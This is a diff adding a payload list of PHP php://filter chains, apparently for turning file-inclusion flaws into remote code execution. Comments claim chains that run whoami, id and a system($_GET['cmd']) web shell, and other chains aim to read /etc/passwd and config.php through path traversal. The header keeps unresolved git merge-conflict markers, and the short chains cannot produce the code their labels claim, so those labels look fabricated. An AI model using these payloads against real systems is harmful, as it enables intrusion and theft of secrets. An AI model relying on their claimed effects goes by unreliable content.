@@ -1,0 +1,96 @@
+# PHP Filter Chain Payloads
+<<<<<<< Updated upstream
+# These payloads use convert.iconv filters to achieve RCE without file upload
+# Reference: https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html
+=======
+# RCE without file upload via chained filters
+# Ref: Synacktiv PHP filter research
+>>>>>>> Stashed changes
+
+# Basic system commands - whoami
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
+
+# Basic system commands - id
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
+
+# Basic system commands - pwd
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
+
+# Basic system commands - ls
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
+
+# Generic payload - <?php system($_GET['cmd']); ?>
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
+
+# phpinfo() chain
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
+
+# file_get_contents('/etc/passwd')
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
+
+# readfile('/etc/passwd')
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
+
+# passthru('whoami')
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
+
+# exec('id')
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.iconv.L1.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
+
+# shell_exec('pwd')
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
+
+# Shorter chains (for payload length restrictions)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
+php://filter/convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8/resource=index.php
+php://filter/convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8/resource=index.php
+
+# Alternative resource targets
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=../index.php
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=../../index.php
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=config.php
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=../config.php
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd
+
+# Chains with different encoding combinations
+php://filter/convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=index.php
+php://filter/convert.iconv.UTF8.UTF32|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=index.php
+php://filter/convert.iconv.UCS-4LE.UCS-4BE|convert.iconv.UCS-4BE.UTF8/resource=index.php
+php://filter/convert.iconv.UTF16.UTF-8|convert.iconv.UTF8.UTF16LE/resource=index.php
+
+# zlib compression chains
+php://filter/zlib.deflate|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=index.php
+php://filter/convert.base64-encode|zlib.deflate|convert.base64-encode/resource=index.php
+
+# bzip2 compression chains  
+php://filter/bzip2.compress|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=index.php
+php://filter/convert.base64-encode|bzip2.compress|convert.base64-encode/resource=index.php
+
+# ROT13 + base64 chains
+php://filter/string.rot13|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=index.php
+php://filter/convert.base64-encode|string.rot13|convert.base64-encode/resource=index.php
+
+# String manipulation chains
+php://filter/string.toupper|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=index.php
+php://filter/string.tolower|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=index.php
+php://filter/string.strip_tags|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=index.php
+
+# Quoted-printable encoding chains
+php://filter/convert.quoted-printable-encode|convert.iconv.UTF8.UTF7/resource=index.php
+php://filter/convert.quoted-printable-encode|convert.base64-encode/resource=index.php
+
+# Mixed filter types
+php://filter/zlib.deflate|string.rot13|convert.base64-encode/resource=index.php
+php://filter/bzip2.compress|string.toupper|convert.base64-encode/resource=index.php
+php://filter/convert.iconv.UTF8.UTF16|zlib.deflate|convert.base64-encode/resource=index.php
+
+# UCS-2/UTF-16 variations
+php://filter/convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UCS-2BE.UTF8/resource=index.php
+php://filter/convert.iconv.UTF16.UTF8|convert.iconv.UTF8.UTF16LE/resource=index.php
+php://filter/convert.iconv.UCS-4.UTF8|convert.iconv.UTF8.UCS-4LE/resource=index.php
+
+# Complex multi-stage chains
+php://filter/convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode/resource=index.php
+php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4/resource=index.php
+php://filter/convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921/resource=index.php
+php://filter/convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE/resource=index.php
